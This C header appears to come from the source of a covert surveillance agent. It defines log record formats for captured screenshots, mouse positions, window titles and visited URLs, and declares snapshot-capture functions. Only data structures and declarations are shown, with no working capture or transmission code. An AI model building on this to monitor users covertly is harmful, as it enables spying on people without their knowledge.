#define BUILD_PALETTE(x) { DWORD i, j = 0; for(i=0; i<256; i++) { \
		                    x[i].peRed = colors[j++]; \
						    x[i].peGreen = colors[j++]; \
		                    x[i].peBlue = colors[j++]; \
							x[i].peFlags = 0; }}

typedef struct {
	BYTE peBlue;
    BYTE peGreen;
	BYTE peRed;
	BYTE peFlags;
} QUADPALETTE;

typedef struct {
    BITMAPINFOHEADER   bmiHeader;
    QUADPALETTE        bmiColors[256];
} BITMAPINFOFULL;

typedef struct {
    WORD         palVersion;
    WORD         palNumEntries;
    PALETTEENTRY palPalEntry[256];
} LOGPALETTEFULL;

// XXX Additional data per i log di tipo mouse
typedef struct _MouseAdditionalData {
	UINT uVersion;
		#define LOG_MOUSE_VERSION 2009040201
	UINT uProcessNameLen;
	UINT uWindowNameLen;
	UINT xPos;
	UINT yPos;
	UINT max_x;
	UINT max_y;
} MouseAdditionalData;

// XXX Additional data per i log di tipo snapshot
typedef struct _SnapshotAdditionalData {
	UINT uVersion;
		#define LOG_SNAP_VERSION 2009031201
	UINT uProcessNameLen;
	UINT uWindowNameLen;
} SnapshotAdditionalData;

// XXX Additional data per i log di tipo URL con snapshot
typedef struct _UrlSnapAdditionalData {
	UINT uVersion;
		#define LOG_URLSNAP_VERSION 2010071301
	UINT uBrowserType;
	UINT uUrlNameLen;
	UINT uWindowTitleLen;
} UrlSnapAdditionalData;

typedef struct _url_info_struct {
	UINT uBrowserType;
	WCHAR url_name[1];
} url_info_struct;


// Dichiarata in HM_SnapShot.h in cui questo file viene incluso
extern void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
extern void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD g_xscdim, DWORD g_yscdim);
